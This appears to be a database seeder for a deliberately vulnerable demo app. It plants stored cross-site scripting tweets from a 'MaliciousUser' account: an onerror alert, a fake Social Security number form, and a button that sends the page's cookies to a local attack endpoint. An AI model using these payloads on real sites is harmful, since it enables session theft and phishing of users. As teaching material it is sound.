'use strict';
const { User, Tweet } = require('../models');

const tweets = [
  {
    body: "This is a tweet written by a Malicious User."
  },
  {
    body: `<img src="" onerror="alert('if you see this alert pop up on your screen, then this page is prone to an XSS attack')">`
  },
  {
    body: `<form onsubmit="alert('You got DUPED -MaliciousUser')"><label>Social Security Number: <input type="number"></label><button>Submit</button></form>`
  },
  {
    body: `<button id="mal" onclick="(() => {const link='http://localhost:5002/attack?cookies='+encodeURIComponent(document.cookie);navigator.clipboard.writeText(link);document.querySelector('#mal').outerHTML='Open the copied link in incognito';})();">Copy Malicious Link</button>`
  },
  {
    body: `<svg width="24" height="24"><path fill="white" d="M11 2.206l-6.235 7.528-.765-.645 7.521-9 7.479 9-.764.646-6.236-7.53v21.884h-1v-21.883z"/></svg>Opening the malicious link steals users credentials and redirects you to the malicious website.`
  }
];

module.exports = {
  async up (queryInterface, Sequelize) {
    const maliciousUser = await User.findOne({
      where: {
        username: 'MaliciousUser'
      }
    });
    for (let tweet of tweets) {
      await maliciousUser.createTweet(tweet);
    }
  },

  async down (queryInterface, Sequelize) {
    const maliciousUser = await User.findOne({
      where: {
        username: 'MaliciousUser'
      }
    });
    await Tweet.destroy({
      where: {
        authorId: maliciousUser.id
      },
    });
  }
};
